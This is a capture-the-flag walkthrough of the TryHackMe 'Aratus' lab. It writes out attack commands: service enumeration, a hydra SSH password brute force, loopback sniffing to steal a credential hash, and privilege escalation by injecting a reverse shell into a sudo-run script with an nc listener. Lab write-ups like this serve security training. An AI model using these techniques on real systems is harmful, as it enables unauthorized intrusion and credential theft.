# Aratus | THM
### Difficulty level: Medium
----------------------------------

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*PpL-YQ_OoYvBIsWd1GpYqw.png)

Perform a penetration test against a vulnerable machine. 
Your end-goal is to become the root user and retrieve the two flags:

/home/{{user}}/user.txt
/root/root.txt

The flags are always in the same format, where XYZ is a MD5 hash: THM{XYZ}.

The first step is to scan the machine with Nmap and save the results into a file:
```
nmap -sC -sV <ip-address> > nmap.txt
```

Results:
```bash
Host is up (0.15s latency).
Not shown: 974 filtered tcp ports (no-response), 20 filtered tcp ports (host-prohibited)
PORT    STATE  SERVICE      VERSION
21/tcp  open   ftp          vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:<ip-address>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
22/tcp  open   ssh          OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 092362a2186283690440623297ff3ccd (RSA)
|   256 33663536b0680632c18af601bc4338ce (ECDSA)
|_  256 1498e3847055e6600cc20977f8b7a61c (ED25519)
80/tcp  open   http         Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apache HTTP Server Test Page powered by CentOS
139/tcp closed netbios-ssn
443/tcp open   ssl/http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
| ssl-cert: Subject: commonName=aratus/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-11-23T12:28:26
|_Not valid after:  2022-11-23T12:28:26
|_http-title: 400 Bad Request
445/tcp closed microsoft-ds
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.42 seconds
```
There are 4 open ports:
21 — FTP
22- SSH
80- HTTP
443- HTTPS

Firstly, check the anonymous login :
```bash
ftp anonymous@<ip-address>
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*tr9KCozWXpjlr448e1i8UA.png)

Secondly, check http port:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*u99Fe_bTCFvpxHrTxi4qjQ.png)

Keep going with the enumeration with enum4linux:
```bash
enum4linux <ip-address>
```

Results:
![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*lWjSnYuYONTJ2rL0M7j3-g.png)

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*4dpAT7XNE6-zGoPkIyEr5w.png)

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*7APKZQzyU06iW6B4XQiMCA.png)

Start with share’s inspection:

```bash
smbclient //<ip-address>/"temporary share"
```

Results:
![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*yks5fE7wP0w7VoIyo6HoTg.png)

Grab the message with “get” command.

```bash
Simeon,

Stop messing with your home directory, you are moving files and directories insecurely!
Just make a folder in /opt for your book project...

Also you password is insecure, could you please change it? It is all over the place now!

- Theodore
```
Check simeon directory with : <ip-address/simeon>

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Kb4bcP14t6_007Le9yex1g.png)

Generate wordlist from the content with :

```bash
cewl <ip-address> > wordlist.txt
```

Use hydra to find simeon's password:

```bash
hydra -l simeon -P wordlist.txt ssh://<ip-address> -v
```
![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*PF4IbcXkVwV3K0cM5VAISw.png)

Connect SSH with those credentials:
```bash
ssh simeon@<ip-address>
```
![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*PckR5X2POW94ZM9F4ComUA.png)

There is no user.txt flag that simeon can read, trying moving to “theodore”.
but how?
Upload linpeas.sh to the machine by opening python server, 
curl it simeon’s machine, give it execute permission and run.

There is a bingo:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*CH5i48t1PZiakpmk8WqY7A.png)

Check the networks that relate to the machine with “ip add”.
There are 2 networks: ‘lo’ and ‘eth0’.
Check ‘lo’ traffic with:
```bash
tcpdump -i lo -A
```
![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*qFYr-zLQBD4HRQuB9sEoAw.png

and there is a hash.
Grab it into a file hash.txt and decode it:
![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*C5KJk7KIdvmWKFWSaDffSQ.png)

Switch user to theodore and cat user.txt flag.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*JVZDkJ4crG_UXtNMyfypwg.png)

**Privilege Escalation**
Find a way to escalate your privilege with sudo -l.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*YuRwgjKtM-LNFiREviMlrA.png)

There is a file that can lead us to root, but it runs only by automation user.
Check what this .sh file does.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*8FE-4YNCyP6NzFVHyr3GqQ.png)

After, execute it as automation user with:

```bash
sudo -u automation /opt/script/infra_as_code.sh
```
There is a file that includes within this .sh file which means it runs when “infra_as_code.sh” is running.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*tf-QJyJyNj9VXXNQA_IMPw.png)

This file has write permission:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*6Pw9rhKTw2g_9Ojz9cngPw.png)

Inject reverse shell payload into this file to get reverse shell.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*H7fCX8YJ67V2SDXS3n5VCw.png)

Open netcat listener:

```bash
nc -lnvp 2222
```

Run infra_as_code.sh as automation user again.
```bash
sudo -u automation /opt/scripts/infra_as_code.sh 
```

and there is a shell. cat root.txt flag.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*BMRmCywf4am1RD6PuGbaZw.png)

This is Aratus on TryHackMe platform. I hope that you find this writeup helpful.

Happy Hacking!

**Written by Alon Presman, Penetration Tester and Ethical Hacker.**

























